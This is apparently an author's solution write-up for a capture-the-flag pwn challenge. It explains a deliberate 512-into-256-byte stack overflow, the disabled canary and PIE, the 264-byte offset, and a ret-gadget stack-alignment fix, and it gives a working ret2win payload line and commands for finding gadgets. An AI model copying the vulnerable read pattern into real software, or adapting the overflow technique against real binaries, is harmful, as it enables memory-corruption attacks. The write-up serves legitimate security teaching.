# Double It And Give It To The Next Person — Author Writeup

**Category:** pwn · **Difficulty:** easy–medium · **Type:** stack buffer overflow → ret2win (with stack-alignment fix)

> ⚠️ This writeup contains the full solution. Keep it out of the player bundle
> (`dist/`). Ship players only `dist/double_it/`.

---

## The bug

`start_the_chain()` reads up to `0x200` (512) bytes into a **256-byte** stack
buffer with no bounds check:

```c
char name[256];
read(0, name, 0x200);   // reads 512 into 256 -> overflow
```

`break_the_chain()` calls `system("/bin/cat flag.txt")`, but is **never called**
in normal flow. It's a ret2win target sitting at a fixed address because the
binary is built `-no-pie`.

## Mitigations (intentionally relaxed)

| Mitigation      | State | Why |
|-----------------|-------|-----|
| Stack canary    | OFF (`-fno-stack-protector`) | nothing guarding the saved RIP |
| PIE/ASLR of binary | OFF (`-no-pie`) | `break_the_chain()` has a fixed address |
| NX              | ON (default) | it's ret2win, not shellcode |
| RELRO           | default | irrelevant here |

## The offset

256-byte buffer + 8-byte saved RBP = **264 bytes** to reach the saved return
address. Confirmed empirically (see the offset probe in the build notes):

```
offset=264 -> flag{...}
```

## The twist: stack alignment

`break_the_chain()` calls `system()`, which routes through glibc's
`do_system()`. That code uses `movaps`, which **faults unless RSP is 16-byte
aligned** at the call site. The naive payload:

```
padding (264 * 'A')  +  p64(break_the_chain)      # CRASHES in movaps
```

lands with RSP misaligned and segfaults before the flag prints. The fix is to
return through one extra bare `ret` gadget first, which pops 8 bytes and
realigns RSP:

```
padding (264 * 'A')  +  p64(ret_gadget)  +  p64(break_the_chain)   # WORKS
```

Verified empirically: naive → no flag (crash); with the `ret` gadget → flag.

## The exploit

Reference exploit: `solve/solve.py` (works with or without pwntools).

```python
payload = b"A"*264 + struct.pack("<Q", 0x400356) + struct.pack("<Q", 0x4004c6)
#                    ^ ret gadget (realign)        ^ break_the_chain
```

> The addresses above (`break_the_chain` = `0x4004c6`, a bare `ret` gadget =
> `0x400356`) are from the reference build in this repo. If you recompile with a
> different toolchain/flags, re-read them:
>
> ```sh
> nm double_it | grep break_the_chain                      # win address
> objdump -d double_it | awk '/\tc3\s+ret/{print $1; exit}' # a ret gadget
> ```
>
> (Or just let a tool find a gadget: `ROPgadget --binary double_it --only ret`.)

## Hosting

- `server/serve.sh` — bare-metal socat service (`nc host 1337`).
- `server/Dockerfile` + `server/entrypoint.sh` — containerized service; set the
  real flag via the `FLAG` env var at `docker run`.

The service runs the binary with its CWD set to the directory holding the real
`flag.txt`; players get the fake flag in their local bundle.

## Build / verify

```sh
make            # build ./double_it
make dist       # produce dist/double_it.tar.gz (player bundle + TEST flag)
./solve/solve.py            # verify locally
./solve/solve.py HOST PORT  # verify against the live service
```
